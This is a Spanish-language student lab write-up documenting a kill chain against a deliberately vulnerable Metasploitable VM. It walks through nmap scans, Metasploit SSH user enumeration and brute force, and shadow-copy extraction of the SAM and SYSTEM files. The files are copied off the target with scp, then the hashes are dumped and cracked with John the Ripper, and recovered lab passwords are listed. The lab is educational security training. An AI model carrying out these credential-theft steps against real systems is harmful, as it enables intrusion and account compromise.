---
title: "Lab 02 - DOCUMENTACIÓN DETALLADA DEL KILL CHAIN"

date: 2026-06-07 10:00:00 -0500
categories: [Cyberseguridad]
tags: [KillChain, Nmap, Kali, Metasploitable]
---
# **PASOS DETALLADOS DE LAS ACCIONES DEL KILL CHAIN 1 - SEMANA 06 _ MIET 2026 I**

El presente laboratorio tiene como finalidad comprender y documentar las diferentes fases del Kill Chain en un entorno controlado utilizando Kali Linux y Metasploitable. Durante el desarrollo de la práctica se realizaron actividades de reconocimiento, enumeración, acceso inicial y obtención de credenciales, documentando cada una de las evidencias obtenidas.

## I. Preparación del Entorno de Laboratorio

🖥️💻

Metasploitable en VirtualBox es       utlizada como la máquina objetivo, la cual contiene vulnerabilidades incorporadas para fines educativos y de entrenamiento en ciberseguridad.

🌐📡📶

Mediante una red virtual se configura la conectividad entre Kali Linux y Metasploitable, fundamental para realizar actividades de reconocimiento, escaneo y análisis de vulnerabilidades 

### Creación de Snapshot

˙✧˖°📷 ༘ ⋆｡˚

Antes de iniciar se creó una instantánea (Snapshot) de la máquina virtual Metasploitable, con el fin de conservar un respaldo en caso de errores, alguna configuración incorrecta o modificaciones producidas durante el laboratorio.

*Procedimiento realizado para el snapshot*

☪︎ Seleccionar la máquina virtual Metasploitable. 

![Importación](/assets/imag2/fig01.png)

☪︎ Acceder a la sección Snapshots de VirtualBox y seleccionar la opción Take Snapshot.

![Importación](/assets/imag2/fig02.png)

☪︎ Asignar un nombre descriptivo.

![Importación](/assets/imag2/fig03.png)

☪︎ Guardar la instantánea.

![Importación](/assets/imag2/fig04.png)

## II. Desarrollo del Kill Chain 01: SSH Brute Force + Credential Dumping

### Etapa 1️⃣﹕Reconocimiento

Es la recopilación y analisis de información de la maquina objetivo antes de la intrusión. 

*1.1. Configuración del Segmento de Red*

En la VM Kali se ejecuta el comando *ip a* para ver la IP asignada para la interfaz eth0. Como se 👁️‍🗨️ observa a continuación: .

![Importación](/assets/imag2/fig05.png)
_Figura 05. La VM de Kali Linux tiene la dirección 10.0.2.3/24_

Ahora, para conocer la dirección IP del metasplotable, ejecutamos ipconfig. 

![Importación](/assets/imag2/fig06.png)
_Figura 06. La VM de Metasploitable tiene la dirección 10.0.2.15/24_


*1.2. Comando de Escaneo Inicial con Nmap*

Se utiliza para  identificar dispositivos activos en la red y hacer un escaneo sin resolución de dominio.

Para este laboratorio se ejecuta: _"nmap -sn 10.0.2.0/24"_

Se identificaron los dispositivos activos presentes en la red virtual.*Ver 👀 Figura 07*

![Importación](/assets/imag2/fig07.png)

De la Figura anterior, se observa las siguientes direcciones:

╰┈➤ 10.0.2.1: router virtual que implementa el VirtualBox.

╰┈➤10.0.2.2: servidor DNS virtual que implementa el VirtualBox.

☑ Nuestro target es la dirección ip 10.0.2.15/24.

*1.3. Escaneo agresivo*

Se realizó un escaneo agresivo utilizando **Nmap** sobre la máquina objetivo. El parámetro -A permitió detectar versiones de servicios, sistema operativo y ejecutar scripts de reconocimiento. El parámetro -p- permitió analizar la totalidad de los puertos TCP disponibles en el sistema objetivo. *Ver 👀 Figuras 08*

![Importación](/assets/imag2/fig08.png)
![Importación](/assets/imag2/fig08a.png)
![Importación](/assets/imag2/fig08b.png)
![Importación](/assets/imag2/fig08c.png)
![Importación](/assets/imag2/fig08d.png)
![Importación](/assets/imag2/fig08e.png)
![Importación](/assets/imag2/fig08f.png)
![Importación](/assets/imag2/fig08g.png)
![Importación](/assets/imag2/fig08h.png)
![Importación](/assets/imag2/fig08i.png)

A parte del escaneo agresivo, existen otros métodos clasificados por su velocidad, sigilo e intención:

*1. Escaneo SYN (Stealth Scan):*

![Importación](/assets/imag2/fig09.png)

*2. Escaneo de UDP:*

Se realizó un escaneo UDP utilizando Nmap para identificar servicios que operan sobre dicho protocolo. A diferencia de los escaneos TCP, este procedimiento permite detectar servicios como DNS, DHCP o SNMP, que también forman parte de la superficie de ataque de la máquina objetivo.

![Importación](/assets/imag2/fig10.png)


*3. Escaneo de Vulnerabilidades (con Scripts):* 

El análisis se centró en los puertos 80 (HTTP) y 445 (SMB). Como resultado, se obtuvo información sobre posibles debilidades de seguridad que podrían ser aprovechadas.

![Importación](/assets/imag2/fig11.png)


*4. Escaneos FIN, NULL o Xmas:*

Los escaneos FIN, NULL y Xmas no se usan tanto, incluye porque forman parte de las técnicas de evasión y reconocimiento. 

Son escaneos TCP "no convencionales" que intentan descubrir puertos abiertos utilizando paquetes especiales.

_A. FIN Scan_

El escaneo FIN no identificó puertos abiertos. Nmap reportó que los 1000 puertos TCP analizados se encontraban cerrados y respondieron con paquetes RST.

_B. NULL Scan_

El escaneo NULL mostró que los puertos analizados se encontraban cerrados, respondiendo con paquetes RST. No se identificaron puertos abiertos mediante esta técnica.

_C. Xmas Scan_

El escaneo Xmas tampoco detectó puertos abiertos. Todos los puertos analizados fueron reportados como cerrados.

![Importación](/assets/imag2/fig12.png)

*1.4. Confirmación de Firewall Activo*

Este paso es para verificar el estado del firewall de la máquina objetivo antes de iniciar las actividades del laboratorio.

Sintaxis General
traceroute <dirección_IP>

traceroute to 10.0.2.15
1  10.0.2.15  0.xxx ms  0.xxx ms  0.xxx ms

Obtenido:
![Importación](/assets/imag2/fig13.png)


### Etapa 2️⃣﹕Enumeración de servicios

El escaneo permitió identificar la disponibilidad del servicio SSH (Secure Shell) en la máquina objetivo y obtener información sobre la versión del servicio que se encuentra ejecutándose.

Comando Ejecutado: "nmap -p 22 -sV 10.0.2.15" 

![Importación](/assets/imag2/fig14.png)

### Etapa 3️⃣﹕Acceso Inicial

Se preparan las listas de usuarios y contraseñas que serán utilizadas durante las pruebas de autenticación.

3.1. Descarga de diccionarios

Realizamos la búqueda desde una pagina de Firefox de Kali para la descarga de estos repositorios de diccionarios útiles para la ejecucion de este laboratorio:

a. Lists para Usernames
b. kyou para Passwords
c. nashi para Passwords

![Importación](/assets/imag2/fig15.png)

Al descargar el diccionario Rockyou en el Kali Linux, se descomprime:

![Importación](/assets/imag2/fig16.png)

Corroboramos que contenga el usuario vagrant.

![Importación](/assets/imag2/fig17.png)

3.2. Enumeración de Usuarios con Metasploit

La enumeración de usuarios consiste en determinar qué cuentas existen en un sistema remoto. Para ello se utilizó el módulo ssh_enumusers de Metasploit, el cual permite identificar usuarios válidos a través de las respuestas generadas por el servicio SSH.

![Importación](/assets/imag2/fig18.png)

a continuacion se configuran : RHOSTS y USER_FILE, como se observa:

![Importación](/assets/imag2/fig19.png)

y mostramos las opciones actualizadas:

![Importación](/assets/imag2/fig20.png)

*Resultado:*

Es el usuario encontrado: "Vagrant"

![Importación](/assets/imag2/fig21.png)


3.3. Ataque de Fuerza Bruta en SSH

Después de la fase anterior ya sabemos que existe el usuario: "Vagrant", se procedió a realizar un ataque de fuerza bruta utilizando el módulo ssh_login de Metasploit.

Ejecutamos "show options" para identificar las opciones que vamos aconfigurar:

![Importación](/assets/imag2/fig22.png)

a continuacion para este módulo se vuelven a configurar : RHOSTS, USERNAME, USER_FILE y VERBOSE como se observa:

![Importación](/assets/imag2/fig23.png)

y se muestran las opciones actualizadas:

![Importación](/assets/imag2/fig24.png)

A continuación:

_run:_ Ejecuta el módulo configurado.

El módulo realizó múltiples intentos de autenticación sobre el usuario vagrant utilizando las contraseñas contenidas en el diccionario.

![Importación](/assets/imag2/fig25.png)

### Etapa 4️⃣﹕Explotación y Acceso

Una vez identificadas credenciales válidas, se estableció una conexión remota mediante el protocolo SSH. Esto permitió acceder a la consola del sistema objetivo y ejecutar comandos de administración y reconocimiento interno.

Comando Ejecutado: _ssh vagrant@10.0.2.15_

![Importación](/assets/imag2/fig26.png)


### Etapa 5️⃣﹕Extracción de Archivos SAM y SYSTEM usando vssown.vbs

5.1. Comprueba los Privilegios

El comando **whoami /priv** muestra los privilegios asignados al usuario actual(abversario).
En el laboratorio se busca verificar la presencia de privilegios como:

  __SeBackupPrivilege y SeRestorePrivilege__

![Importación](/assets/imag2/fig27.png)

Estos dos privilegios son importante para ejecutar el script de Volume Shadow Copy Service (VSS).


5.2. Localiza el Script vssown.vbs

🔎 Desde la máquina Kali Linux se accedió mediante un navegador web al repositorio donde se encuentra disponible el script vssown.vbs. Para poder descargar y almacenarlo localmente para ser tranferirlo a la máquina víctima.

![Importación](/assets/imag2/fig28.png)

Luego, copiamos el script a la maquina victima usando _scp:_

  scp vssown.vbs vagrant@10.0.2.15:C:\\Users\\vagrant\\Downloads

![Importación](/assets/imag2/fig29.png)

Una vez transferido, listar el archivo _vssown.vbs_ para verificar que se encuentra en esta carpeta.

  ssh vagrant@10.0.2.15 'ls -lh C:\\Users\\vagrant\\Downloads\\vssown.vbs'

  vagrant@10.0.2.15's password: 

  -rw-r--r-- 1 vagrant None 8.6K Oct  5 05:24 C:\Users\vagrant\Downloads\vssown.vbs

![Importación](/assets/imag2/fig30.png)

![Importación](/assets/imag2/fig30a.png)


5.3. ¿Qué podemos hacer con el vssown.vbs?

El script vssown.vbs permite interactuar con el servicio Volume Shadow Copy Service (VSS) de Windows para generar una copia de sombra del volumen C:. Esta copia contiene versiones accesibles de archivos protegidos por el sistema operativo.

![Importación](/assets/imag2/fig31.png)

![Importación](/assets/imag2/fig31a.png)

5.4. Ejecuta el script _vssown.vbs_

A. Se inicia con el servicio Volume Shadow Copy.

   'cscript
   C:\Users\vagrant\Downloads>cscript vssown.vb /start'

![Importación](/assets/imag2/fig32.png)


Verificamos el estado del servicio Volume Shadow Copy

   'cscript
   C:\Users\vagrant\Downloads>cscript vssown.vb /status'

![Importación](/assets/imag2/fig32a.png)

Creamos la copia del shadow volumen C.

   'cscript
   C:\Users\vagrant\Downloads>cscript vssown.vb /create c'

![Importación](/assets/imag2/fig32b.png)

Listamos las copias de volumen shadow existentes.

   'cscript
   C:\Users\vagrant\Downloads>cscript vssown.vb /list'

![Importación](/assets/imag2/fig32c.png)
![Importación](/assets/imag2/fig32d.png)
![Importación](/assets/imag2/fig32e.png)
![Importación](/assets/imag2/fig32f.png)

5.5. Copia los Archivos SAM y SYSTEM

Ahora que tenemos la ruta de la copia del volumen shadow, entrar en modo cmd y copiamos los archivos SAM y SYSTEM del volumen shadow:

![Importación](/assets/imag2/fig33.png)

![Importación](/assets/imag2/fig34.png)

Nota: Reemplazar HarddiskVolumeShadowCopyX con HarddiskVolumeShadowCopy1.

Salimos del modo _cmd_


### Etapa 6️⃣﹕Transferir los Archivos SAM y SYSTEM al atacante

Se usa _scp_ para que los archivos sean descargados exitosamente en Kali Linux para continuar con la extracción y análisis de hashes.

  scp vagrant@10.0.2.15:/cygdrive/c/Windows/Temp/SAM .

![Importación](/assets/imag2/fig35.png)

  scp vagrant@10.0.2.15:/cygdrive/c/Windows/Temp/SYSTEM .
  
![Importación](/assets/imag2/fig36.png)


### Etapa 7️⃣﹕

La herramienta _samdump2_ permite procesar los archivos SAM y SYSTEM de Windows para recuperar los hashes NTLM de las cuentas locales.

Para funcionar correctamente, necesita ambos archivos:

SAM: contiene los hashes de las contraseñas.
SYSTEM: contiene las claves necesarias para descifrar la información almacenada en SAM.

*Comando Ejecutado* 
  samdump2 SYSTEM SAM > hashes.txt

![Importación](/assets/imag2/fig37.png)
![Importación](/assets/imag2/fig37a.png)

nota: Eliminar el historial de contraseñas previamente crackeadas por John the Ripper.

Con el comando:
  rm ~/.john/john.pot

ya que almacena contraseñas almacenadas, y si el archivo ya contiene resultados previos, John puede omitir mostrar algunas credenciales durante nuevas ejecuciones.

**Crackeo de Hashes usando John the Ripper**

De los procedimientos anteriores, obtuvimos los archivos SAM y SYSTEM desde Windows. Luego usamos samdump2 para convertir esa información en hashes de contraseñas.

Finalmente, John the Ripper comparó esos hashes contra millones de contraseñas de un diccionario hasta encontrar coincidencias, permitiendo recuperar las contraseñas reales de varios usuarios del sistema.

![Importación](/assets/imag2/fig38.png)


Contraseñas recuperadas:

       vagrant      (Administrator)

       pr0t0c0l     (c_three_pio)

       mandalorian1 (boba_fett)


![Importación](/assets/imag2/fig39.png)

